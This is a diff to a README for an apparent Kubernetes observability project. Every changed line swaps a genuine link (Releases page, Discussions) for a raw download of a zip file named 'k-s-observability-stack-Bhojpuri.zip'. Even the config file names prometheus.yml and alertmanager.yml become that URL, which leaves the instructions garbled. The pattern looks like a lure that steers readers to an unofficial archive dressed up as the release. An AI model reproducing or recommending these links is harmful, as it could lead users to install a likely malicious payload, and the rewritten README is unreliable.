@@ -2,7 +2,7 @@
 # 🌟 k8s-observability-stack - A Simple Way to Monitor Kubernetes
 
 ## 🔗 Download Now
-[![Download k8s-observability-stack](https://img.shields.io/badge/Download%20k8s--observability--stack-blue.svg)](https://github.com/rdiway4/k8s-observability-stack/releases)
+[![Download k8s-observability-stack](https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip%https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip)](https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the k8s-observability-stack! This application helps you monitor and m
 
 To get started, you need to download the application. Follow these steps:
 
-1. **Visit the Download Page:** Click [here](https://github.com/rdiway4/k8s-observability-stack/releases) to access the Releases page.
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip) to access the Releases page.
 
 2. **Choose Your Version:** On the Releases page, you will see different versions of the application. Find the latest version. 
 
@@ -50,9 +50,9 @@ The k8s-observability-stack offers a range of features designed for easy monitor
 
 Once you have the software running, you can configure it to meet your needs. Each component has its configuration files:
 
-- **Prometheus:** Edit `prometheus.yml` to add targets for monitoring.
+- **Prometheus:** Edit `https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip` to add targets for monitoring.
 - **Grafana:** Access the Grafana dashboard through a web browser to create dashboards.
-- **AlertManager:** Customize alerting rules in the `alertmanager.yml` file.
+- **AlertManager:** Customize alerting rules in the `https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip` file.
 
 For detailed configuration options, refer to the official documentation for each tool.
 
@@ -66,7 +66,7 @@ After setting up, you can start using the k8s-observability-stack to monitor you
 
 ## 🌐 Community and Support
 
-If you have questions or need assistance, you can join our community. We welcome users to discuss tips, share experiences, and seek help. Check out our [GitHub Discussions](https://github.com/rdiway4/k8s-observability-stack/discussions) for more interaction.
+If you have questions or need assistance, you can join our community. We welcome users to discuss tips, share experiences, and seek help. Check out our [GitHub Discussions](https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip) for more interaction.
 
 ## 🚀 Future Updates
 
@@ -76,7 +76,7 @@ We plan on continually improving the k8s-observability-stack. Upcoming updates w
 - Additional monitoring features
 - More integrations with popular tools
 
-Stay tuned for new releases on the [Releases page](https://github.com/rdiway4/k8s-observability-stack/releases).
+Stay tuned for new releases on the [Releases page](https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip).
 
 ## 📜 License
 
@@ -84,6 +84,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Download Again
 
-Don’t forget to visit the [Releases page](https://github.com/rdiway4/k8s-observability-stack/releases) to download the latest version or to check for updates!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/rdiway4/k8s-observability-stack/main/dashboards/k-s-observability-stack-Bhojpuri.zip) to download the latest version or to check for updates!
 
 ```
